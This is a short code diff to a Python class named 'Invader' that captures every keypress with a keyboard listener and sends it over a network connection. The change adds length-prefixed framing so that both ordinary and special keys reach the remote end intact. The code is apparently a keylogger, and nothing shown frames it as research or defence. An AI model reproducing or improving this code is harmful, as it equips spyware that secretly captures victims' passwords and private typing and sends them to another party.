@@ -30,9 +30,11 @@ class Invader:
 
     def OnPress(self, key):
         try:
-           self.conn.send(key.char.encode())
+           KeyChat = key.char.encode()
+           self.conn.sendall(len(KeyChat).to_bytes(1, "big") + KeyChat)
         except AttributeError:
-            self.conn.send('*')
+            SpKeyChat = str(key).encode()
+            self.conn.sendall(len(SpKeyChat).to_bytes(1, "big") + SpKeyChat)
 
     def GetKey(self):
         with keyboard.Listener(on_press=self.OnPress) as listener:
